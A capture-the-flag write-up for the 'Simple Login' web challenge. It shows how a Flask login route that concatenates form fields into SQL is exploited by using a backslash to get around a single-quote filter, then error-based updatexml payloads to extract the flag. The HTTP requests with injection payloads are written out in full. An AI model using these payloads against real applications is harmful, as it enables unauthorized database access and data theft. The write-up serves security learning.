# Simple Login

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 84 solves / 108 points
- Author: @ark
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

A simple login service :)

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901170143.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901165716.png)

When we go to `/`, it redirected us to `/login`, which means we'll need to login first.

Let's try some random credentials, such as `admin:admin`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901165752.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901165800.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901165842.png)

When we clicked the "Login" button, it'll send a POST request to `/login` with parameter `username` and `password`.

As expected, since the random credential that we just submitted is incorrect, it responded to us with "No user".

Hmm... Because this kind of request usually done with a database. Let's try some **SQL injection** payloads, like `' OR 1=1-- -`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901170259.png)

This time it responded with "Do not try SQL injection". Looks like the web application is filtering out SQL injection payload! To figure what does the filter do, we can view this web application's source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/Simple-Login/simple-login.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-2-(Web)/Simple-Login)-[2024.09.01|17:05:36(HKT)]
└> file simple-login.tar.gz 
simple-login.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 20480
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-2-(Web)/Simple-Login)-[2024.09.01|17:05:38(HKT)]
└> tar xvzf simple-login.tar.gz 
simple-login/
simple-login/db/
simple-login/db/init.sql
simple-login/compose.yaml
simple-login/web/
simple-login/web/app.py
simple-login/web/templates/
simple-login/web/templates/index.html
simple-login/web/templates/login.html
simple-login/web/Dockerfile
simple-login/web/requirements.txt
```

After reading the source code a little, we can have the following findings:
1. This web application is written in Python with [Flask](https://flask.palletsprojects.com/en/3.0.x/) web application framework
2. This web application uses a DBMS (Database Management System) called [MySQL](https://www.mysql.com/), and it uses [PyMySQL](https://github.com/PyMySQL/PyMySQL) for the client connection

Let's deep dive into those logics!

First off, what's our objective? Where's the flag?

In `simple-login/db/init.sql`, we can see that the flag is inserted into table `flag`:

```sql
USE chall;

DROP TABLE IF EXISTS flag;
CREATE TABLE IF NOT EXISTS flag (
    value VARCHAR(128) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

-- On the remote server, a real flag is inserted.
INSERT INTO flag (value) VALUES ('Alpaca{REDACTED}');
[...]
```

So, our goal is this challenge is to somehow **exfiltrate table `flag`'s record**.

Now let's go to `simple-login/web/app.py`. In there, it has 2 routes. However, only 1 of them are really interesting to us, which is POST route `/login`:

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username is None or password is None:
            return "Missing required parameters", 400
        if len(username) > 64 or len(password) > 64:
            return "Too long parameters", 400
        if "'" in username or "'" in password:
            return "Do not try SQL injection 🤗", 400

        conn = None
        try:
            conn = db()
            with conn.cursor() as cursor:
                cursor.execute(
                    f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
                )
                user = cursor.fetchone()
        [...]
    else:
        [...]
```

Right off the bat, we can see there's a SQL injection vulnerability, as this route **directly concatenates our POST parameter `username` and `password` value into the raw SQL query**.

However, this SQL injection vulnerability is not that straight forward to be exploited, as it has this filter:

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    [...]
    if "'" in username or "'" in password:
        return "Do not try SQL injection 🤗", 400
```

As you can see, if our parameter's value **contains** single quote (`'`) character, it'll not execute the raw SQL query.

## Exploitation

Can we bypass this filter? Well, yes!

To do so, we can **use a backslash character (`\`) in the `username` parameter** to **escape the string**, and then we can inject our SQL injection payload into the `password` parameter!

**Original SQL query:**
```sql
SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
```

**Our payload:**
```sql
SELECT * FROM users WHERE username = '\' AND password = ' OR 1=1-- -'
```

Nice! Let's test this!

```http
POST /login HTTP/1.1
Host: 34.170.146.252:41670
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=\&password=+OR+1%3d1--+-
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901172030.png)

We now successfully bypassed the authenticated via SQL injection!

But wait, the flag is in the table `flag`...

To exfiltrate the flag record, we can use an error-based SQL injection payload, such as the following:

```http
POST /login HTTP/1.1
Host: 34.170.146.252:41670
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

username=\&password=+and+updatexml(null,concat(0x0a,version()),null)-- -
```

> Note: The above payload is from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---updatexml-function).

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901172352.png)

```http
POST /login HTTP/1.1
Host: 34.170.146.252:41670
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

username=\&password=+and+updatexml(null,concat(0x0a,(select+*+from+flag)),null)--+-
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901172556.png)

Although the output is truncated, we can try to remove the new line character (`0x0a`) in the `concat` function:

```http
POST /login HTTP/1.1
Host: 34.170.146.252:41670
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

username=\&password=+and+updatexml(null,concat((select+*+from+flag)),null)--+-
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-2-Web/images/Pasted%20image%2020240901172708.png)

- **Flag: `Alpaca{SQLi_with0ut_5ingle_quot3s!}`**

## Conclusion

What we've learned:

1. SQL injection without single quotes